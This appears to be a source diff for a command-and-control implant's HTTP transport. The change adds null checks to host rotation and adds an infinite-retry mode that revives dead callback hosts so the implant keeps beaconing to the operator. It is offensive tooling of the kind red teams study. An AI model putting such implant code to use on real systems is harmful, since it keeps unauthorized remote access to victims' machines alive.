@@ -28,9 +28,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
     TokenImpersonate( FALSE );
 
-    /* Get our host based on host rotation options */
-    // Instance.Config.Transport.Host = HostRotation();
-
+    /* if we don't have any more hosts left, then exit */
     if ( ! Instance.Config.Transport.Host )
     {
         PUTS( "No hosts left to use... exit now." )
@@ -325,6 +323,7 @@ PHOST_DATA HostRotation( SHORT Strategy )
     {
         DWORD Count = 0;
 
+        /* get linked list */
         Host = Instance.Config.Transport.Hosts;
 
         /* If our current host is empty
@@ -334,13 +333,15 @@ PHOST_DATA HostRotation( SHORT Strategy )
 
         for ( Count = 0; Count < HostCount();  )
         {
+            /* check if it's not an emtpy pointer */
+            if ( ! Host )
+                break;
+
             /* if the host is dead (max retries limit reached) then continue */
             if ( Host->Dead )
                 Host = Host->Next;
             else break;
         }
-
-        return Host;
     }
     else if ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
     {
@@ -351,9 +352,35 @@ PHOST_DATA HostRotation( SHORT Strategy )
         if ( Host->Dead )
             /* fallback to Round Robin */
             Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
-
-        return Host;
     }
+
+    /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
+     * as the operator wants. */
+    if ( ( Instance.Config.Transport.HostMaxRetries == 0 ) && ! Host )
+    {
+        PUTS( "Specified to keep going. To infinity... and beyond" )
+
+        /* get linked list */
+        Host = Instance.Config.Transport.Hosts;
+
+        /* iterate over linked list */
+        for ( ;; )
+        {
+            if ( ! Host )
+                break;
+
+            /* reset failures */
+            Host->Failures = 0;
+            Host->Dead     = FALSE;
+
+            Host = Host->Next;
+        }
+
+        /* tell the caller to start at the beginning */
+        Host = Instance.Config.Transport.Hosts;
+    }
+
+    return Host;
 }
 
 DWORD HostCount()
@@ -366,6 +393,7 @@ DWORD HostCount()
     Host = Head;
 
     do {
+
         if ( ! Host )
             break;
 
@@ -376,6 +404,7 @@ DWORD HostCount()
         /* if we are at the beginning again then stop. */
         if ( Head == Host )
             break;
+
     } while ( TRUE );
 
     return Count;
